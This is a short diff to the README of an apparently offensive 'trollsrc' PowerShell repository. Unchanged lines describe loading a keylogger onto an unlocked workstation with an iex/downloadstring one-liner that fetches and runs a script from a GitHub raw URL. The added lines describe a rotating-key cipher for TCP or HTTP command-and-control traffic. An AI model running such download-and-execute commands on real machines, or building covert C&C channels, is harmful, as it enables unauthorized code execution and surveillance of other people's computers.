@@ -27,3 +27,6 @@ Have a problem with admins leaving their workstations unlocked? Teach them a les
 * keyimp.ps1 and simple-keyimp.ps1 are intended to be loaded from the target user session (unlocked workstation)
 * loads up a keylogger that pops calc.exe anytime 'c' is pressed
 * iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/keyimp.ps1")
+
+## .\bxor.ps1
+* Example code for BXOR rotating-key cipher. Can be bolted onto simple TCP or HTTP C&C connections
